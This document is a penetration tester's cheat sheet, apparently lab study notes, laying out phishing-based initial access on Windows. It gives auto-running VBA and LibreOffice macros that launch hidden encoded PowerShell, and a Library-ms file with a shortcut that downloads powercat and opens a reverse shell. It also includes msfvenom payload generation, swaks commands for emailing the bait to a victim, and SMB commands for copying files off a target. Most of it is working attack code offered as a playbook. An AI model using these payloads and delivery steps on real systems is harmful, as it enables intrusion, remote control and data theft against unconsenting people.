# Target Reconnaissance
## Information Gathering

- Sweep for files e.g. pdf/ doc with Gobuster pattern
- Read file metadata
  
  ``` exiftool -a -u xxx.pdf ```

- ``` stat {file} ``` see when the file access/modify/change etc

- ``` file {file} ```

# Useful splitter
- Splitter.py 
    ```
        s = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoA7AA=="
        n = 50
        for i in range(0, len(s), n):
            chunk = s[i:i + n]
            print('Str = Str + "' + chunk + '"')
    ```

# Exploit Microsoft Office

## Macro Abuse
- With old .doc file
- macro func must enabled
- windows use utf-16le base64 decode encode
- smbserver to transfer files:
   sometimes anonymous dont work due to policy
   ``` 
   impacket-smbserver -smb2support -username kali -password kali share .
   \\ip-address-of-your-linux-machine\SHARE
   ```
- Advance tech transfer files 
   ```
    net use z: \\192.168.45.243\SHARE /user:kali kali
    Copy-Item -Path 20240728062407_BloodHound.zip -Destination z:\BloodHound.zip
    
    [folder]
    Copy-Item -Path c:\inetpub\wwwroot -Destination z:\files -Recurse

    [if cmd only --> zip file first then] 
    xcopy C:\inetpub.zip Z:\

    ```



- Macro example: 
    ``` 
        Sub AutoOpen()
            MyMacro
        End Sub

        Sub Document_Open()
            MyMacro
        End Sub

        Sub MyMacro()
            Dim Str As String
            
            Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
                Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
                Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
            ...
                Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
                Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
                Str = Str + "A== "

            CreateObject("Wscript.Shell").Run Str
        End Sub
    ``` 

- useful post-exploit file transfer: https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/ 

## Execution vis Windows Library Files
- create a folder for this
1. Prepare Send email to victim containing 'config.Library-ms' which direct to malicious wsgidev 
    ``` 
    wsgidav --host=0.0.0.0 --port 80 --auth=anonymous --root /home/kali/webdav/
    ```

2. Edit IP variable to our kali and save as 'config.Library-ms' (extension = all files) then double click the file and copy paste itself into the folder
    ```
        <?xml version="1.0" encoding="UTF-8"?>
        <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
        <name>@windows.storage.dll,-34582</name>
        <version>6</version>
        <isLibraryPinned>true</isLibraryPinned>
        <iconReference>imageres.dll,-1003</iconReference>
        <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
        </templateInfo>
        <searchConnectorDescriptionList>
        <searchConnectorDescription>
        <isDefaultSaveLocation>true</isDefaultSaveLocation>
        <isSupported>false</isSupported>
        <simpleLocation>
        <url>http://192.168.119.2</url>
        </simpleLocation>
        </searchConnectorDescription>
        </searchConnectorDescriptionList>
        </libraryDescription>
    ```
3. edit the .ink file (shortcut) to run reverse shell & change the file name to install
    ``` 
        powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
        powercat -c 192.168.119.3 -p 4444 -e powershell"
    ```
4. Prepare web server hosting powercat file
   ``` 
    cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
    python3 -m http.server 8000
    ```
MUST USE non 80 port!!

## SMTP tool
Send email with given information e.g. receiver/sender, smtp server usrname pw
- SWAKS
  ``` sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.151.199 --body body.txt --header "Subject: Problems" --suppress-data ```
- sendemail
    ``` sendemail -f 'jonas@localhost' \
        -t 'mailadmin@localhost' \
        -s 192.168.244.140:25 \
        -u 'a spreadsheet' \
        -m 'Please check this spreadsheet' \
        -a exploit.ods 
    ```
- Test login ``` swaks -server {ip} --auth LOGIN --auth-user {user email} --auth-password {password} --quit-after AUTH ```

## Exploit Libre Office
1. Prepare payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta ```
2. Split the file
3. open new .ods file and add macro under the file
   ```
    Sub Macro 
    Dim Str as String
    Str = Str + "cmd /c powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
...
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
    Str = Str + "A== "
    Shell(Str)

   ```
4. Enable auto-run once this excel is open: Tools → Customize